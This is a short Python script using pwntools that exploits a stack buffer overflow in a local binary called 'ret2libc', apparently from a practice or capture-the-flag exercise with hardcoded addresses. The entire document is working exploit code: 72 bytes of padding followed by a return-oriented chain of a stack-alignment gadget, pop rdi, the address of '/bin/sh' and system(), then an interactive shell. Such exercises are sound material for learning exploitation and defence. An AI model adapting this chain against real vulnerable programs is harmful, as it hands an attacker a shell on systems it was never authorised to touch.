from pwn import *

# Context helps pwntools handle padding and packing automatically
context.binary = binary = ELF('./ret2libc')

# 1. Addresses (Double-check these after running 'vmmap' in GDB)
libc_base = 0x7ffff7c00000
bin_base  = 0x555555554000 # CHECK THIS IN GDB using 'vmmap'

# 2. Gadgets & Functions
system_addr = libc_base + 0x53910
bin_sh_addr = libc_base + 0x1a7e3c
pop_rdi     = libc_base + 0x2a405
ret_gadget  = bin_base  + 0x1016  # The alignment fix

# 3. Padding (Update this with the offset you found in Step 1)
offset = 72 
payload = b"A" * offset

# 4. The Chain
payload += p64(ret_gadget)  # Stack alignment (16-byte)
payload += p64(pop_rdi)     # Put /bin/sh into RDI
payload += p64(bin_sh_addr) 
payload += p64(system_addr)

# Run it
p = process('./ret2libc')
p.sendline(payload)
p.interactive()
